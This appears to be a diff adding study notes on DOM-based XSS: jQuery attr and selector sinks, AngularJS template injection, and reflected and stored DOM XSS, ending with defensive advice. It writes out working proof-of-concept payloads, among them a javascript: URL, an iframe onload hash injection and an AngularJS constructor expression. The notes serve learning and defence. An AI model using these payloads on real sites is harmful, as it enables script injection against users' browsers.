@@ -341,3 +341,87 @@ div.insertAdjacentHTML("beforeend", "<img src=x onerror=alert(1)>");
 
 * Always trace source → sink paths when analyzing DOM XSS.
 ---
+
+## 🧩 Sources and Sinks in Third‑Party Dependencies
+
+Modern apps often use libraries like **jQuery**, which introduce extra sources/sinks for DOM XSS.
+
+### jQuery `.attr()` Sink
+- **Code**:
+  ```javascript
+  // backend processing : $('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
+  payload : ?returnUrl=javascript:alert(document.domain)
+  Back link becomes javascript: → executes on click.
+  ```
+
+jQuery $() Selector Sink : 
+
+code backend processing: 
+```javascript
+ $(window).on('hashchange', function() {
+  var element = $(location.hash);
+  element[0].scrollIntoView();
+});
+```
+source : location.hash (fragment).
+Exploit: Inject HTML into selector via hash.
+classic payload : 
+```html
+<iframe src="https://vulnerable-website.com#" 
+        onload="this.src+='<img src=1 onerror=alert(1)>'">
+</iframe>
+```
+effect : Hashchange event fires → malicious element injected.
+
+---
+
+# ⚔️ DOM XSS in AngularJS and Reflected/Stored Data
+
+## 📌 AngularJS DOM XSS
+- AngularJS processes expressions inside **double curly braces `{{ ... }}`** when `ng-app` is present.
+- This allows execution of JavaScript‑like code without `<script>` tags or event handlers.
+- Example payload:
+  ```html
+  <div ng-app>
+    {{constructor.constructor('alert(document.domain)')()}}
+  </div>
+  ```
+Even if angle brackets < > and quotes " " are HTML‑encoded, AngularJS still evaluates expressions inside {{ ... }}.
+
+---
+
+## Reflected DOM XSS :
+Occurs when the server reflects user input into the page, and client‑side JavaScript processes it unsafely.
+
+Example:
+
+```javascript
+eval('var data = "reflected string"');
+```
+Flow:
+-User input → echoed by server into HTML/JS.
+-Client script reads reflected data.
+-Data flows into a sink (eval, innerHTML, etc.).
+-Vulnerability is partly server‑side (reflection) and partly client‑side (unsafe sink).
+--- 
+## Stored DOM XSS : 
+Occurs when the server stores attacker input and later reflects it into a page where client‑side JS processes it unsafely.
+
+Example:
+```javascript
+element.innerHTML = comment.author;
+```
+
+Flow:
+- Attacker submits malicious input (e.g., comment).
+- Server stores it.
+- Later page loads comment and inserts it into DOM via unsafe sink.
+- Payload executes in victim’s browser.
+
+---
+
+📝 Key Takeaways
+- AngularJS: Exploitable via {{ ... }} expressions, even without <script> tags.
+- Reflected DOM XSS: Input is echoed immediately and processed by client‑side JS.
+- Stored DOM XSS: Input is saved on server, then later processed unsafely in the DOM.
+- Defense: Encode output, sanitize input, avoid unsafe sinks (eval, innerHTML, etc.), and use frameworks securely.
